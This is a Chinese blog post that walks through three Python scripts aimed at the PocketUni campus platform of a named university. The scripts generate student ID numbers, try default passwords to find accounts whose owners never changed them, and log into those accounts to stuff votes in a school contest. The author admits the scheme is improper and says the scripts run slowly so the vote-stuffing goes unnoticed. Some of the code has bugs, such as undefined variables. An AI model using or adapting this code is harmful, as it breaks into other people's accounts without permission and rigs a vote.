前言：因为班级参加学校一些活动在PU上举办，但是又不想接受这种推广，遂花几天用python3写了个自动投票，想学习的可以一起探讨下，但是这个代码恐怕不写python的人也用不了。。。

写博客主要为了给自己做笔记，省得老忘记实现过程

准备工作：学校各学院的学号加初始密码，总有一些宝宝用初始密码，而学号直接推倒就可得出。

要实现的东西：1、实现自动登录，从大量学号中跑出可登录的学号（使用初始密码的用户）并保存留用；2、利用这些学号根据投票活动选择出要投票的学院的PID；3、模仿JS点击事件投票。


----------


鉴于这也不算很正当行为，防止给PU服务器造成负担，爬虫每天尽量慢尽量少的访问PU服务器。。。也是防止被人发现刷票


----------


批量生成学号：

	# huoqunumber.py 用于创建number初始列表 
	# 保存在startnumber.txt里面
	
	import os
	
	fileObject = open("startnumber.txt", "a")
	numberIn = [15040100, 15040200, 15040500, 15040700, 15040900, 15040300, 15040400, 15040600, 15040800]
	for i in range(0, 1):
		for x in range(1,39):
			numberIn[i] = numberIn[i] + 1
			numberOut = "B" + str(numberIn4[i])
			fileObject.write(numberOut)
			# fileObject.write("\n")
	
	fileObject.close()
	
这部分主要就是I/O流的操作，number数组存放各学院班级的第一个学号，依次生成整个院的学号并保存待用。


----------


爬虫尝试登陆PU并保存可以登录的账号：

	#numbersaved.py 用于获取可登录number列表
	# 保存在numberSaved.txt

	import requests
	import urllib.request
	import re
	import configparser
	from pprint import pprint
	from bs4 import BeautifulSoup 
	
	# headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11'} # 浏览器头
	headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/535.11 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/535.11'} #手机headers
	
	# 拿到不断更新的hash
	def getHash(): 
	    firstURL = "http://pocketuni.net/njupt/login/"
	    request = urllib.request.Request(firstURL, headers=headers)
	    response = urllib.request.urlopen(request)
	    content = response.read()
	    pattern = re.compile(r'name=\"__hash__\" value=\"(.*?)\"', re.S)
	    __hash__ = pattern.findall(str(content, encoding = "utf-8"))
	
	    return __hash__[0]
	
	# 登录并返回cookieLen
	def create_session(loginURL, data):
	
	    session = requests.session()
	    login = session.post(loginURL, loginData, headers=headers)
	    cookiesLen = len(login.cookies)
	    print(login.cookies)
	    return session, cookiesLen
		
	if __name__ == '__main__':
	    count = 0 # 统计拿到多少可用账号
	    loginUrl = "http://pocketuni.net/index.php?app=home&mod=Public&act=doLogin&school=njupt"
	    file_object = open('B140413.txt', 'r')
	    file_number = open("B140413login.txt", "a")
	    file_nonumber = open("B140413nologin.txt", "a")
	    school = "南京邮电大学"
	    sid = "592"
	    password = "123456"
	    login = "登 录"
	    while True: # 按字节读文件
	        try:
	            number = file_object.read(9)
	            print(type(number))
	            __hash__ = getHash()
	            loginData = {'school':school, 'sid':sid, 'number':number, 'password':password, 'login':login, '__hash__':__hash__[0]}
	            session,cookiesLen = create_session(loginUrl, loginData) 
	            print(cookiesLen)
	            if cookiesLen == 0: # 通过判断cookieLen得知是否登录成功
	                print(cookiesLen)
	                file_number.write(number + "\n")
	                count += 1
	                
	        except Exception as e:
	            print(e)
	        if not number:
	            break
	    file_object.close()
	    file_number.close()
	    print("登录了" + str(count) + "个number！") 
```
这里写代码片
```
	    
登录部分主要是从上一步骤中拿到的文件中按字符读取学号，并带上浏览器的头headers向form表单post登录所需信息

```
loginData = {'school':school, 'sid':sid, 'number':number, 'password':password, 'login':login, '__hash__':__hash__[0]}
```

难点一：其中hash是为了防止恶意爬取做的随机数，每次刷新网页就会更新，所以首先要解决的就是动态获取hash的值，方法：
拿到登录页面的html并正则匹配出hash的值并返回，这个时候要注意的就是拿到的html是字节流，也就是所谓的乱码，我们要进行转换成str，然后才可以进行匹配，如果这里有疑惑可以查看此处：python3 decode与encode

> http://www.cnblogs.com/tingyugetc/p/5727383.html

	pattern = re.compile(r'name=\"__hash__\" value=\"(.*?)\"', re.S)
	__hash__ = pattern.findall(str(content, encoding = "utf-8"))

难点二：如何判断是否登录成功。最开始我以为只要拿到状态码200即是登录成功，其实只要对方服务器进行回应那就是200了，所以这个方法显然不能证明成功登陆了，后来发现登录成功与否拿到的cookie的长度是不一样的，当cookieLen=0的时候是成功登陆否则是不成功。

登录：

    session = requests.session()
    login = session.post(loginURL, loginData, headers=headers)

获取cookieLen：

	cookiesLen = len(login.cookies)
判断一下cookieLen，若为0则证明可以登录保存下来。


----------


接下来是模仿JS发送投票请求（PU要求没人投满六个才算数）
	
	# pachong.py
	
	import requests
	import urllib.request
	import re
	import configparser
	from pprint import pprint
	from bs4 import BeautifulSoup 
	
	# headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11'}
	headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/535.11 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/535.11'}
	
	def getHash():
	    firstURL = "http://pocketuni.net/njupt/login/"
	    request = urllib.request.Request(firstURL, headers=headers)
	    response = urllib.request.urlopen(request)
	    content = response.read()
	    pattern = re.compile(r'name=\"__hash__\" value=\"(.*?)\"', re.S)
	    __hash__ = pattern.findall(str(content, encoding = "utf-8"))
	    return __hash__[0]
	
	def create_session(loginURL, data):
	
	    session = requests.session()
	    login = session.post(loginURL, loginData, headers=headers)
	    print(login.cookies)
	    return session
	# 投票函数
	def toupiao(toupiaoUrl, session, toupiaoData):
	    login = session.post(toupiaoUrl, toupiaoData, headers = headers)
	    return login.cookies
	
	if __name__ == '__main__':
	    count = 0
	    loginUrl = "http://pocketuni.net/index.php?app=home&mod=Public&act=doLogin&school=njupt"
	    file_object = open('numbersaved.txt', 'rb')
	    school = "南京邮电大学"
	    sid = "592"
	    password = "111111"
	    login = "登 录"
	    
	    toupiaoUrl = "http://njupt.pocketuni.net/index.php?app=event&mod=Front&act=vote"
	    pids = ["98359", "99982", "99957", "99420", "93253", "98681"]

	    while True:
	        try:
	            number = file_object.read(9)
	            __hash__ = getHash()
	            loginData = {'school':school, 'sid':sid, 'number':number, 'password':password, 'login':login, '__hash__':__hash__[0]}
	            session = create_session(loginUrl, loginData) 
	            for pid in pids:
	                toupiaoData = {'id':idd, 'pid':pid}
	                toupiao(toupiaoUrl, session, toupiaoData)
	                
	        except Exception as e:
	            print(e)
	        count+=1
	        if not number:
	            break
	    file_object.close()
	    print("投票数：" + str(count))
	
此处发送登录请求与huoqunumber.py是相同的，此处读取的账号列表是huoqunumber.py得到的可登录列表。

向toupiaourl页面的form表单带headers发送数据：
	
    login = session.post(toupiaoUrl, toupiaoData, headers = headers)

因为要投票满6个院，所以遍历pid，此处的pid则是学院的唯一标识，一定要找到自己的学院并右键检查拿到pid放入列表中！
	
	for pid in pids:
		toupiaoData = {'id':idd, 'pid':pid}
		toupiao(toupiaoUrl, session, toupiaoData)



----------

重要的三个py文件已经贴出，使用顺序：

	huoqunumber.py --> numbersaved.py --> pachong.py
huoqunumber.py得到的初始化学号，numbersaved.py利用其得到可以登录的学号（即初始化密码没有修改的同学），pachong.py利用numbersaved.py拿到的可登录账号登陆并进行投票。


----------


结语：当时三天的纠结忘记的差不多了，就记得几个重要的点，代码也是随时想到哪里写到哪里凌乱的不行。。。
